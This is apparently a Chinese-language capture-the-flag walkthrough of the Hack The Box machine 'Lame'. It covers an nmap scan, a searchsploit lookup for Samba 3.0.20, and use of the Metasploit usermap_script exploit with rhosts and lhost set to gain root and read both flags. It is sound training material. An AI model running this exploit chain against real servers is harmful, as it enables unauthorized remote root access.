### 靶机介绍

名称:Lame

目标：寻找`root.txt`和`user.txt`

难度：容易

![](img/b1bad3531b3838f7c7d915fef5486b06.png)

### 打靶过程

连接`hack the box`的`vpn`

`openvpn xxxx.ovpn`

![](img/93b3d0748915520c841e09829e52153a.png)

使用`nmap`进行资产收集

`sudo nmap -Pn -A 10.10.10.3`

![](img/2e7ba3009689fede35ff0adee9bbccf3.png)

![](img/2c62d7bfdf5c284182259ce6adff03b3.png)

尝试连接21端口，但是里面没东西

![](img/16bf891a00f237d7b15344dc0d6a6565.png)

发现 `445/tcp open tcpwrapped Samba smbd 3.0.20-Debian` 这个存在可以利用的漏洞

查找的`Samba 3.0.20`的可利用漏洞

`sudo searchsploit Samba 3.0.20`

![](img/ef2c6305f7c982c6649243bac8a75251.png)

使用`msf`框架，进行打靶

`sudo msfconsole`

![](img/39027eec2a99f3656d51aa796fbaf448.png)

进入`msf`, 查找`Samba`

`search Samba`

![](img/d3acc481a38754f47470f0a3d4247432.png)

使用模块

`use exploit/multi/samba/usermap_script`

![](img/7a017e38f4e336b352f5e8f972a5bc56.png)

设置好选项

```
set rhosts 10.10.10.3
set lhost 10.10.17.237
```

![](img/6430159043a3c45a8af7da47e964dd94.png)

查看用户为`root`

![](img/e78a5106bf33b127835995ddf95dd2d7.png)

寻找`flag`,进入`root`目录下，发现`root.txt`

![](img/b2607b85d215a0fc25429def9c3f2ab0.png)

查看`root.txt`文件，发现第一个`flag`

![](img/e5c3180c47403746fba08dbbbe8d6492.png)

进入`home`目录下的`makis`，发现第二个`flag`为`user.txt`

![](img/11a1de795ed1068c7ab184561642afe3.png)
